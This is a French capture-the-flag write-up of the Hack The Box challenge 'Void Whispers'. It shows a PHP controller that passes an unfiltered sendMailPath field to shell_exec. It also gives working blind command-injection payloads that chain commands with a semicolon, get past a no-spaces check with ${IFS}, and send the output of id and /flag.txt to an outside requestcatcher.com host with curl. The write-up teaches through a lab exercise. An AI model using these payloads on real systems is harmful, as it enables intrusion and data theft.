# Void Whispers


Void Whispers repose sur une `Blind Command Injection` : l’exploitant injecte des commandes système via une entrée non sécurisée, puis utilise des techniques comme le time-based blind (mesure des délais de réponse) ou l’exfiltration des résultats via des requêtes HTTP externes pour récupérer le flag ou des données sensibles.

## Command Injection

Lorsque j’arrive sur le site je vois que tout ce que je peux faire c’est cliquer sur le bouton `Save` et qui met à jour la config.

![image.png](/images/VoidWhispers/image.png)

Dans tout le code source, voici la partie qui nous intéresse. C’est le fichier `IndexController.php`.

```php
<?php
class IndexController
{
  private $configFile = 'config.json'; 
  private $config;

  public function __construct() {
    if (file_exists($this->configFile)) {
      $this->config = json_decode(file_get_contents($this->configFile), true);
    } else {
      $this->config = array(
        'from' => 'Ghostly Support', 
        'email' => 'support@void-whispers.htb',
        'sendMailPath' => '/usr/sbin/sendmail',
        'mailProgram' => 'sendmail',
      );
    }
  }

  public function index($router)
  {
    $router->view('index', ['config' => $this->config]);
  }

  public function updateSetting($router)
  {
    $from = $_POST['from'];
    $mailProgram = $_POST['mailProgram'];
    $sendMailPath = $_POST['sendMailPath'];
    $email = $_POST['email'];

    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
      return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
    }

    if (preg_match('/\s/', $sendMailPath)) {
      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
    }

    $whichOutput = shell_exec("which $sendMailPath");
    if (empty($whichOutput)) {
      return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
    }

    $this->config['from'] = $from;
    $this->config['mailProgram'] = $mailProgram;
    $this->config['sendMailPath'] = $sendMailPath;
    $this->config['email'] = $email;

    file_put_contents($this->configFile, json_encode($this->config));

    return $router->jsonify(['message' => 'Config updated successfully!', 'status' => 'success'], 200);
  }
}

```

Dans la fonction `updateSetting`, je vois que le paramètre `sendMailPath` n’est pas filtré. La condition `preg_match('/\s/', $sendMailPath` permet de verifier qu’il n’y a pas d’espace dans l’entrée de l’utilisateur. Sauf que là `$whichOutput = shell_exec("which $sendMailPath");` il est passé dans la commande `shell_exec` sans autres filtres. Ce qui signifie qu’il suffit d’ajouter un point virgule et d’y insérer une autre commande pour que cette dernière soit exécutée.

```php
  public function updateSetting($router)
  {
    $from = $_POST['from'];
    $mailProgram = $_POST['mailProgram'];
    $sendMailPath = $_POST['sendMailPath'];
    $email = $_POST['email'];

    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
      return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
    }

    if (preg_match('/\s/', $sendMailPath)) {
      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
    }

    $whichOutput = shell_exec("which $sendMailPath");
    if (empty($whichOutput)) {
      return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
    }
```

Il n’y a pas d’erreur lorsque j’exécute cette commande. Donc maintenant il ne me reste plus qu’à trouver un moyen d’afficher le resultat de la commande. 

![image.png](/images/VoidWhispers/image1.png)

Pour cela, je vais utiliser [RequestCatcher](https://requestcatcher.com) pour recevoir le résultat des commandes. Les instances web de Hackthebox sont en lignes et non dans une réseau privé accessible par VPN.

```bash
/usr/sbin/sendmail;curl${IFS}-X${IFS}POST${IFS}-d${IFS}"$(id)"${IFS}https://z3rodol.requestcatcher.com/test
```

![image.png](/images/VoidWhispers/image2.png)

Maintenant je récupère le flag.

```bash
/usr/sbin/sendmail;curl${IFS}-X${IFS}POST${IFS}-d${IFS}"$(cat${IFS}/flag.txt)"${IFS}https://z3rodol.requestcatcher.com/test
```

![image.png](/images/VoidWhispers/image3.png)

